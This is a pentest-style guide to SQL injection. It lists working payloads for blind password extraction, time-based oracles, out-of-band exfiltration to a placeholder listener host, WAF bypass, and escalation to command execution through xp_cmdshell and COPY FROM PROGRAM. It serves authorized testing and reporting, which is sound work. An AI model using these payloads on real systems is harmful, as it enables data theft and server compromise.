# SQL Injection — Deep Dive

Beyond `' OR 1=1`. This is the extraction machinery and evasion that matter when the easy cases are
blocked — blind exfiltration algorithms, DBMS fingerprinting, out-of-band, second-order, and filter
bypass at the character level. Authorized testing only; prove against benign values and never dump
more than needed.

## Fingerprint the engine first

Payloads diverge per DBMS; identify it before extracting:

- **String concat:** `'a'||'b'` (Oracle/Postgres), `'a'+'b'` (MSSQL), `CONCAT('a','b')` / `'a' 'b'`
  (MySQL).
- **Version:** `@@version` (MySQL/MSSQL), `version()` (Postgres), `banner FROM v$version` (Oracle).
- **Comments/quirks:** `-- -`, `#` (MySQL), `/**/`; MySQL `FROM dual` optional, Oracle requires it.
- Error strings and time-function names (`SLEEP`, `pg_sleep`, `WAITFOR DELAY`, `DBMS_LOCK.SLEEP`)
  are tells.

## UNION extraction

1. **Column count:** `ORDER BY 1,2,3...` until error, or `UNION SELECT NULL,NULL,...` until it
   matches.
2. **Which columns render** and their type: replace NULLs with a marker string one at a time.
3. **Schema:** `information_schema.tables` / `.columns` (MySQL/MSSQL/Postgres);
   `all_tables`/`all_tab_columns` (Oracle).
4. **Dump:** select the target columns; concatenate multiple into one rendered column with the
   engine's concat + a separator.

## Blind — boolean extraction

No data reflected, but the response differs on true/false. Extract char-by-char:

```
' AND (SUBSTRING((SELECT password FROM users WHERE username='admin'),{i},1))='{c}'-- -
```

Binary-search the character with comparison instead of equality (`> 'm'`) to cut requests from 95
to ~7 per char. Automate the oracle: a stable response feature (length, a keyword, status) = true.

## Blind — time-based

No visible difference at all → make truth cost time:

```
MySQL   ' AND IF(({cond}),SLEEP(5),0)-- -
Postgres'; SELECT CASE WHEN ({cond}) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
MSSQL   '; IF ({cond}) WAITFOR DELAY '0:0:5'-- -
Oracle  ' AND {cond} AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ...)
```

Measure round-trip; threshold well above jitter. Slow but universal.

## Out-of-band (OAST) — fastest blind when egress exists

Trigger a DNS/HTTP lookup to a listener you control, carrying the data in the subdomain:

- **MSSQL:** `xp_dirtree '\\'+({data})+'.you.oob\x'`
- **Oracle:** `UTL_HTTP.request` / `UTL_INADDR.get_host_address(({data})||'.you.oob')` /
  `SYS.DBMS_LDAP.INIT`
- **MySQL** (Windows/`secure_file_priv` off): `LOAD_FILE(CONCAT('\\\\',{data},'.you.oob\\a'))`
- **Postgres:** `COPY ... TO PROGRAM` where allowed, or a dblink/extension.

The DNS hit exfiltrates without a visible response and is much faster than boolean/time.

## Second-order

Input is stored safely, then later concatenated into a query by *another* feature. The injection
fires where it's *used*, not where it's *submitted* — so test values that persist (usernames,
profile fields) and watch downstream operations.

## Filter / WAF bypass (character level)

- **Comments as whitespace:** `UNION/**/SELECT`; MySQL versioned comments `/*!50000UNION*/`.
- **Case & keyword splitting:** `UnIoN`, `SEL/**/ECT`, `%53ELECT`.
- **Encoding:** URL, double-URL, unicode, hex literals (`0x61646d696e`), `CHAR()`/`CHR()`.
- **Whitespace alternatives:** `%09 %0a %0c %0d %a0`, parentheses (`UNION(SELECT(...))`), `/**/`.
- **Logic without quotes:** hex/`CHAR()` for strings when quotes are filtered; `LIKE` tricks.
- **No-comma UNION:** `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b`.

## To RCE / file access (where the config allows)

- **MSSQL:** `xp_cmdshell` (if enabled), `sp_OACreate`.
- **MySQL:** `INTO OUTFILE`/`DUMPFILE` (web-root write) with `FILE` priv and `secure_file_priv` off.
- **Postgres:** `COPY ... FROM PROGRAM`, or the large-object / extension routes.
- Stacked queries where the driver allows multiple statements.

## Testing discipline & reporting

Confirm with the least-invasive proof (a boolean oracle on a benign value, a version string).
Don't dump user data at scale — extract enough to prove it (a row count, your own record). Report:
the injectable parameter, the technique, the exact payload, and the proof (rendered data, timing,
or OOB hit). Fix is always **parameterized queries** — say so.
